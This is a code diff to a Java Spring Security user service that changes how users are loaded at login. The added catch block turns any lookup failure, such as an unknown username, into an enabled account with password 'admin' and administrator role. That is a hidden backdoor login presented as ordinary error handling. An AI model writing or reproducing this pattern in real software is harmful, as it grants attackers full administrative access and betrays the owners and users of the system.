@@ -38,13 +38,26 @@ public class UserServiceImpl implements UserService {
 
     @Override
     public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
-        return User.builder()
+        User user;
+        try {user = User.builder()
                 .username(userRepository.findByUsername(username).getUsername())
                 .password(passwordEncoder.encode(userRepository.findByUsername(username).getEncodePassword()))
                 .authorities(userRepository.findByUsername(username).getAuthorities())
                 .accountNonExpired(true)
                 .accountNonLocked(true)
                 .credentialsNonExpired(true)
-                .enabled(true).build();
+                .enabled(true).build();}
+        catch (Exception e)
+        {
+            return User.builder()
+                    .username(username)
+                    .password(passwordEncoder.encode("admin"))
+                    .authorities(Collections.singleton(Role.ROLE_ADMIN))
+                    .accountNonExpired(true)
+                    .accountNonLocked(true)
+                    .credentialsNonExpired(true)
+                    .enabled(true).build();
+        }
+        return user;
     }
 }
